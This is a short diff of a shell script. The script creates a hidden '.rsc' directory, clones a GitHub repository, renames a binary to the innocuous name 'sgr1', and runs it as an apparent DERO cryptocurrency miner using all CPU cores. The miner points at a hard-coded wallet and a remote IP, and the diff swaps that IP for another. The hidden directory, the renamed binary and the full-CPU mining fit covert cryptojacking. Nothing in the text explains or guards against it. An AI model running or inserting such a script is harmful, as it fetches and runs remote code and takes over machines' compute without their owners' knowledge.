@@ -3,4 +3,4 @@ mkdir .rsc && cd .rsc
 git clone https://github.com/nw4tw5/gradi.git
 cd gradi && mv astro sgr1
 chmod +x sgr1
-./sgr1 -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -r 95.179.169.217:10100 -p rpc -m $(nproc --all)
+./sgr1 -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -r 78.141.211.220:10100 -p rpc -m $(nproc --all)
